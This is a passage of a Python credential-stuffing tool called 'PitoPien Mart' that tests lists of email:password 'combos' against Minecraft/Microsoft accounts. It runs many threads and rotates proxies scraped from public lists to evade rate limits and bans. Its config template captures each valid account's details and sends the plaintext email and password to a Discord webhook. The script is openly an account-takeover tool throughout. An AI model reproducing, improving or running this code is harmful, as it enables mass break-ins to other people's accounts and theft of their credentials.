    print(f"{Fore.YELLOW}Other: {other}" + Style.RESET_ALL)
    print(f"{Fore.LIGHTMAGENTA_EX}Valid Mail: {vm}" + Style.RESET_ALL)
    print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)
    print(Fore.LIGHTRED_EX+"Press any key to exit." + Style.RESET_ALL)
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if not proxylist or proxytype == "'4'": # No proxies loaded or 'None' selected
        return None

    selected_proxy = random.choice(proxylist)
    
    proxy_url = ""
    auth = ""

    if 'user' in selected_proxy and 'pass' in selected_proxy:
        auth = f"{selected_proxy['user']}:{selected_proxy['pass']}@"

    if proxytype == "'1'": # HTTP
        proxy_url = f"http://{auth}{selected_proxy['host']}:{selected_proxy['port']}"
        return {'http': proxy_url, 'https': proxy_url}
    elif proxytype == "'2'": # SOCKS4
        proxy_url = f"socks4://{auth}{selected_proxy['host']}:{selected_proxy['port']}"
        return {'http': proxy_url, 'https': proxy_url}
    elif proxytype == "'3'" or proxytype == "'5'": # SOCKS5 or Auto Scraper (which uses SOCKS5)
        proxy_url = f"socks5://{auth}{selected_proxy['host']}:{selected_proxy['port']}"
        return {'http': proxy_url, 'https': proxy_url}
    else: # Fallback, should not happen if input validation is correct
        return None

def Checker(combo):
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}" + Style.RESET_ALL)
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}" + Style.RESET_ALL)
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config
    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'Max Retries': 5,
            'Proxyless Ban Check': False,
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''}
        c['Scraper'] = {
            'Auto Scrape Minutes': 5
        }
        c['Captures'] = {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True
        }
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))

def get_proxies():
    global proxylist
    # Clear proxylist before scraping
    proxylist.clear() 

    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt" 
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt" 
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt" 
    ]

    def fetch_and_parse(url, protocol_type):
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status() # Raise an exception for HTTP errors
            lines = response.text.splitlines()
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(':')
                if len(parts) == 2: # ip:port
                    try:
                        proxylist.append({'host': parts[0], 'port': int(parts[1]), 'type': protocol_type})
                    except ValueError:
                        continue # Skip if port is not an integer
                # Scrapers usually return ip:port. If they return authenticated, manual parsing would be needed.
                # For now, stick to ip:port for scraped proxies.
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Error scraping proxies from {url}: {e}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"An unexpected error occurred while processing {url}: {e}" + Style.RESET_ALL)

    # Fetch and parse proxies for each type
    for service in api_http:
        fetch_and_parse(service, 'http')
    for service in api_socks4: 
        fetch_and_parse(service, 'socks4')
    for service in api_socks5: 
        fetch_and_parse(service, 'socks5')

    # Geonode proxies (usually returns JSON with 'ip' and 'port' fields)
    try:
        geonode_socks4_response = requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data')
        for dta in geonode_socks4_response:
            proxylist.append({'host': dta.get('ip'), 'port': int(dta.get('port')), 'type': 'socks4'})
    except Exception as e:
        print(Fore.RED + f"Error scraping Geonode SOCKS4 proxies: {e}" + Style.RESET_ALL)
    
    try:
        geonode_socks5_response = requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=s5&limit=500").json().get('data')
        for dta in geonode_socks5_response:
            proxylist.append({'host': dta.get('ip'), 'port': int(dta.get('port')), 'type': 'socks5'})
    except Exception as e:
        print(Fore.RED + f"Error scraping Geonode SOCKS5 proxies: {e}" + Style.RESET_ALL)

    # Deduplicate the proxylist
    unique_proxies = []
    seen = set()
    for proxy in proxylist:
        proxy_tuple = (proxy.get('host'), proxy.get('port'), proxy.get('user'), proxy.get('pass'), proxy.get('type'))
        if proxy_tuple not in seen:
            unique_proxies.append(proxy)
            seen.add(proxy_tuple)
    proxylist[:] = unique_proxies # Assign back to original list

    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies' + Style.RESET_ALL)
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()

def banproxyload():
    global banproxies
    os.system('cls') # Clear screen for better GUI
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "  Ban Check Proxy Selection - PitoPien Mart  ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    
    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file for Ban Check',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if proxyfile is None:
        print(Fore.LIGHTRED_EX+"[ERROR] Invalid File. Please select a valid .txt file." + Style.RESET_ALL)
        time.sleep(2)
        banproxyload()
    else:
        try:
            with open(proxyfile.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    line = line.strip()
                    if not line:
                        continue
                    banproxies.append(line)
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(banproxies)}] lines for ban checking." + Style.RESET_ALL)
            time.sleep(2)
        except Exception as ex:
            print(Fore.LIGHTRED_EX+f"[ERROR] Your file is probably harmed or an error occurred: {ex}" + Style.RESET_ALL)
            time.sleep(2)
            banproxyload()
    print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)
    time.sleep(1) # Give user time to read

def Main():
    global proxytype, screen
    utils.set_title("PitoPien Mart by KillinMachine")
    os.system('cls')
    try:
        loadconfig()
    except Exception as e:
        print(Fore.RED+f"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen PitoPien Mart. Error: {e}" + Style.RESET_ALL)
        input()
        exit()
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "            Main Menu - PitoPien Mart          ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    try:
        print(Fore.LIGHTBLACK_EX+"\n(Optimal speed: 100 threads for proxies, max 5 for proxyless.)" + Style.RESET_ALL)
        thread = int(input(Fore.LIGHTBLUE_EX+"Enter number of Threads: " + Style.RESET_ALL))
    except ValueError: # Catch non-integer input for threads
        print(Fore.LIGHTRED_EX+"[ERROR] Must be a number. Please try again." + Style.RESET_ALL) 
        time.sleep(2)
        Main()
    except Exception as e:
        print(Fore.LIGHTRED_EX+f"[ERROR] An unexpected error occurred: {e}. Please try again." + Style.RESET_ALL)
        time.sleep(2)
        Main()

    print(Fore.LIGHTBLUE_EX+"\nProxy Type:")
    print("  [1] Http/s")
    print("  [2] Socks4")
    print("  [3] Socks5")
    print("  [4] None (Proxyless)")
    print("  [5] Auto Scraper (Socks5 Only)" + Style.RESET_ALL)
    proxytype = repr(readchar.readkey())
    try:
        cleaned = int(proxytype.replace("'", ""))
        if cleaned not in range(1, 6):
            print(Fore.RED+f"[ERROR] Invalid Proxy Type [{cleaned}]. Please choose a number between 1 and 5." + Style.RESET_ALL)
            time.sleep(2)
            Main()
    except ValueError:
        print(Fore.RED+f"[ERROR] Invalid input for Proxy Type. Please enter a number." + Style.RESET_ALL)
        time.sleep(2)
        Main()

    print(Fore.LIGHTBLUE_EX+"\nSelect Screen Display:")
    print("  [1] CUI (Console User Interface)")
    print("  [2] Log (Minimal Log Output)" + Style.RESET_ALL)
    screen = repr(readchar.readkey())
    
    print(Fore.LIGHTBLUE_EX+"\nSelect your combo file..." + Style.RESET_ALL)
    Load()
    
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"\nSelect your proxy file..." + Style.RESET_ALL)
        Proxys()
    
    if config.get('proxylessban') == False and config.get('hypixelban') is True:
        print(Fore.LIGHTBLUE_EX+"\nSelect your SOCKS5 Ban Checking Proxies file..." + Style.RESET_ALL)
        banproxyload()
    
    if proxytype =="'5'":
        print(Fore.LIGHTGREEN_EX+"\nScraping Proxies. Please wait, this may take a moment..." + Style.RESET_ALL)
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
        print(Fore.LIGHTGREEN_EX+"Proxy scraping complete. Starting checks..." + Style.RESET_ALL)
        time.sleep(2) # Give user time to read

    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    
    os.system('cls') # Clear screen before starting main loop for clean GUI
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen() # Default to CUI screen if invalid option

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    
    finishedscreen()
    input() # Keep console open after finished screen

check_license()
Main()